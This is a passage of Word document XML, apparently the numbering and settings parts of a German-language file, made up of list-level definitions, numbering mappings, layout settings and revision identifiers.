      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="berschrift6"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1152"/>
        </w:tabs>
        <w:ind w:left="1152" w:hanging="1152"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="berschrift7"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6.%7"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1296"/>
        </w:tabs>
        <w:ind w:left="1296" w:hanging="1296"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="berschrift8"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6.%7.%8"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="1440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="berschrift9"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6.%7.%8.%9"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1584"/>
        </w:tabs>
        <w:ind w:left="1584" w:hanging="1584"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="26" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="56720C30"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2A2C5652"/>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start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="27" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="58F86073"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D03AD520"/>
    <w:lvl w:ilvl="0" w:tplc="DC2C2598">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="FormatvorlageAufzhlung3"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="227"/>
        </w:tabs>
        <w:ind w:left="227" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:caps w:val="0"/>
        <w:strike w:val="0"/>
        <w:dstrike w:val="0"/>
        <w:vanish w:val="0"/>
        <w:color w:val="auto"/>
        <w:position w:val="-2"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>
        <w:vertAlign w:val="baseline"/>
        <w14:shadow w14:blurRad="0" w14:dist="0" w14:dir="0" w14:sx="0" w14:sy="0" w14:kx="0" w14:ky="0" w14:algn="none">
          <w14:srgbClr w14:val="000000"/>
        </w14:shadow>
        <w14:textOutline w14:w="0" w14:cap="rnd" w14:cmpd="sng" w14:algn="ctr">
          <w14:noFill/>
          <w14:prstDash w14:val="solid"/>
          <w14:bevel/>
        </w14:textOutline>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07D7424"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="914EF398"/>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29" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="61E67B5B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DCAE9B92"/>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0" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="672C5011"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B472E9D6"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="432"/>
        </w:tabs>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="36"/>
        <w:szCs w:val="36"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="576"/>
        </w:tabs>
        <w:ind w:left="576" w:hanging="576"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="864"/>
        </w:tabs>
        <w:ind w:left="864" w:hanging="864"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1008"/>
        </w:tabs>
        <w:ind w:left="1008" w:hanging="1008"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1152"/>
        </w:tabs>
        <w:ind w:left="1152" w:hanging="1152"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>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1" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="682D464C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="353CAEA0"/>
    <w:lvl w:ilvl="0" w:tplc="90163964">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="714"/>
        </w:tabs>
        <w:ind w:left="714" w:hanging="357"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings 2" w:hAnsi="Wingdings 2" w:hint="default"/>
        <w:color w:val="808080"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="04070003">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32" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="684B58C6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BE7C520E"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="432"/>
        </w:tabs>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Times New Roman" w:hint="default"/>
        <w:b/>
        <w:bCs w:val="0"/>
        <w:i w:val="0"/>
        <w:iCs w:val="0"/>
        <w:caps w:val="0"/>
        <w:smallCaps w:val="0"/>
        <w:strike w:val="0"/>
        <w:dstrike w:val="0"/>
        <w:noProof w:val="0"/>
        <w:snapToGrid w:val="0"/>
        <w:vanish w:val="0"/>
        <w:color w:val="000000"/>
        <w:spacing w:val="0"/>
        <w:w w:val="0"/>
        <w:kern w:val="0"/>
        <w:position w:val="0"/>
        <w:sz w:val="36"/>
        <w:szCs w:val="36"/>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ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="864"/>
        </w:tabs>
        <w:ind w:left="864" w:hanging="864"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:sz w:val="24"/>
        <w:szCs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3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="68AB3D1C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="EA5084E6"/>
    <w:lvl w:ilvl="0" w:tplc="04070015">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4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6CA126F4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="17B4D0AC"/>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5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6F8E6712"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BE7C520E"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="432"/>
        </w:tabs>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Times New Roman" w:hint="default"/>
        <w:b/>
        <w:bCs w:val="0"/>
        <w:i w:val="0"/>
        <w:iCs w:val="0"/>
        <w:caps w:val="0"/>
        <w:smallCaps w:val="0"/>
        <w:strike w:val="0"/>
        <w:dstrike w:val="0"/>
        <w:noProof w:val="0"/>
        <w:snapToGrid w:val="0"/>
        <w:vanish w:val="0"/>
        <w:color w:val="000000"/>
        <w:spacing w:val="0"/>
        <w:w w:val="0"/>
        <w:kern w:val="0"/>
        <w:position w:val="0"/>
        <w:sz w:val="36"/>
        <w:szCs w:val="36"/>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lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="576"/>
        </w:tabs>
        <w:ind w:left="576" w:hanging="576"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="864"/>
        </w:tabs>
        <w:ind w:left="864" w:hanging="864"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>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584"/>
        </w:tabs>
        <w:ind w:left="1584" w:hanging="1584"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="36" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="7AE44DE0"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B112792E"/>
    <w:lvl w:ilvl="0" w:tplc="0C070001">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="0C070003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="0C070005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="0C070001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="0C070003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="0C070005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="0C070001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="0C070003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="0C070005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="37" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="7D39428E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="47C6DC7A"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="227"/>
        </w:tabs>
        <w:ind w:left="227" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:caps w:val="0"/>
        <w:strike w:val="0"/>
        <w:dstrike w:val="0"/>
        <w:vanish w:val="0"/>
        <w:color w:val="auto"/>
        <w:position w:val="-2"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>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num w:numId="1">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="2">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="33">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="34">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="35">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="36">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="37">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="38">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="39">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="40">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="41">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="42">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="43">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="44">
    <w:abstractNumId w:val="3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40"/>
  <w:displayBackgroundShape/>
  <w:attachedTemplate r:id="rId1"/>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efaultTabStop w:val="709"/>
  <w:hyphenationZone w:val="425"/>
  <w:noPunctuationKerning/>
  <w:characterSpacingControl w:val="doNotCompress"/>
  <w:hdrShapeDefaults>
    <o:shapedefaults v:ext="edit" spidmax="2101"/>
    <o:shapelayout v:ext="edit">
      <o:idmap v:ext="edit" data="2"/>
    </o:shapelayout>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62B2B"/>
    <w:rsid w:val="00000073"/>
    <w:rsid w:val="0000059B"/>
    <w:rsid w:val="00000BCB"/>
    <w:rsid w:val="00001F1A"/>
    <w:rsid w:val="0000254D"/>
    <w:rsid w:val="00002580"/>
    <w:rsid w:val="0000261A"/>
    <w:rsid w:val="00002AF8"/>
    <w:rsid w:val="00004608"/>
    <w:rsid w:val="00004681"/>
    <w:rsid w:val="00004BB0"/>
    <w:rsid w:val="00004D14"/>
    <w:rsid w:val="00005002"/>
    <w:rsid w:val="0000514B"/>
    <w:rsid w:val="00005724"/>
    <w:rsid w:val="00005D16"/>
    <w:rsid w:val="00005DD7"/>
    <w:rsid w:val="000070E2"/>
    <w:rsid w:val="00007104"/>
    <w:rsid w:val="0000748D"/>
    <w:rsid w:val="00010E90"/>
    <w:rsid w:val="00011946"/>
    <w:rsid w:val="00012908"/>
    <w:rsid w:val="000129F8"/>
    <w:rsid w:val="00013CBE"/>
    <w:rsid w:val="0001402B"/>
    <w:rsid w:val="00014805"/>
    <w:rsid w:val="0001483C"/>
    <w:rsid w:val="00014F35"/>
    <w:rsid w:val="00015216"/>
    <w:rsid w:val="00015DC1"/>
    <w:rsid w:val="00016E3D"/>
    <w:rsid w:val="00016F69"/>
    <w:rsid w:val="000179D9"/>
    <w:rsid w:val="00020518"/>
    <w:rsid w:val="000205F4"/>
    <w:rsid w:val="00020D40"/>
    <w:rsid w:val="0002193B"/>
    <w:rsid w:val="0002195C"/>
    <w:rsid w:val="00022523"/>
    <w:rsid w:val="00022D01"/>
    <w:rsid w:val="00023542"/>
    <w:rsid w:val="00023977"/>
    <w:rsid w:val="00023A34"/>
    <w:rsid w:val="00023C8D"/>
    <w:rsid w:val="000241D2"/>
    <w:rsid w:val="00024EC1"/>
    <w:rsid w:val="0002578E"/>
    <w:rsid w:val="00026441"/>
    <w:rsid w:val="00027F92"/>
    <w:rsid w:val="000300F9"/>
    <w:rsid w:val="00030583"/>
    <w:rsid w:val="00030B97"/>
    <w:rsid w:val="0003245A"/>
    <w:rsid w:val="0003393A"/>
    <w:rsid w:val="00033F46"/>
    <w:rsid w:val="0003483A"/>
    <w:rsid w:val="0003488B"/>
    <w:rsid w:val="000349F1"/>
    <w:rsid w:val="00036068"/>
    <w:rsid w:val="00036E04"/>
    <w:rsid w:val="00040299"/>
    <w:rsid w:val="00040B57"/>
    <w:rsid w:val="00041F9C"/>
    <w:rsid w:val="000420E2"/>
    <w:rsid w:val="00042880"/>
    <w:rsid w:val="00042B51"/>
    <w:rsid w:val="000443C7"/>
    <w:rsid w:val="00044441"/>
    <w:rsid w:val="00044978"/>
    <w:rsid w:val="00045606"/>
    <w:rsid w:val="00045C33"/>
    <w:rsid w:val="00046B42"/>
    <w:rsid w:val="00046B89"/>
    <w:rsid w:val="00046F37"/>
    <w:rsid w:val="00050A54"/>
    <w:rsid w:val="00051532"/>
    <w:rsid w:val="00052600"/>
    <w:rsid w:val="000526A3"/>
    <w:rsid w:val="0005406C"/>
    <w:rsid w:val="0005472C"/>
    <w:rsid w:val="00055BAE"/>
    <w:rsid w:val="00055D4E"/>
    <w:rsid w:val="00056778"/>
    <w:rsid w:val="00056E7F"/>
    <w:rsid w:val="00057090"/>
    <w:rsid w:val="00057248"/>
    <w:rsid w:val="000574BE"/>
    <w:rsid w:val="00057C95"/>
    <w:rsid w:val="00057C9C"/>
    <w:rsid w:val="000600C8"/>
    <w:rsid w:val="00060268"/>
    <w:rsid w:val="0006036B"/>
    <w:rsid w:val="00060392"/>
    <w:rsid w:val="00060A91"/>
    <w:rsid w:val="00061450"/>
    <w:rsid w:val="000616C8"/>
    <w:rsid w:val="000622A1"/>
    <w:rsid w:val="00062491"/>
    <w:rsid w:val="00062725"/>
    <w:rsid w:val="000651AC"/>
    <w:rsid w:val="000658DA"/>
    <w:rsid w:val="00065B58"/>
    <w:rsid w:val="000669A8"/>
    <w:rsid w:val="00066C8C"/>
    <w:rsid w:val="00066EE9"/>
    <w:rsid w:val="00067DA5"/>
    <w:rsid w:val="000700A3"/>
    <w:rsid w:val="000706EC"/>
    <w:rsid w:val="000718CC"/>
